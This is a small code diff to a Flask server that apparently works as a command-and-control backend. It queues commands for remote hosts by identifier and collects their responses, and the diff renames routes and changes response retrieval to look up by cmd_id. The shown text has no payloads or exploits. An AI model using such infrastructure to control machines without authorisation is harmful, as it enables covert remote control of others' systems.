@@ -58,7 +58,7 @@ def getCommands(identifier):
     except:
         return '{"command_count":"69420"}'
 
-@app.route("/hosts/<identifier>/responses", methods=["POST"])
+@app.route("/hosts/<identifier>/response", methods=["POST"])
 def getResponse(identifier):
     """
     Accepts a POST request for the client to send responses to.
@@ -118,12 +118,14 @@ def addCommand(identifier):
     command = data["command"]
     return HOSTS[identifier].addCommand(command) #Returns the command ID
 
-@app.route("/hosts/<identifier>/getResponses")
+@app.route("/hosts/<identifier>/responses", methods=["POST"])
 def getResponses(identifier):
     """
-    Returns a list of responses for the host.
+    Returns a response from a host, given a cmd_id.
     """
-    return HOSTS[identifier].getResponses()
+    data = request.json
+    cmd_id = data["cmd_id"]
+    return HOSTS[identifier].getResponse(cmd_id)
 
 def getInfoByIP(IP):
     """
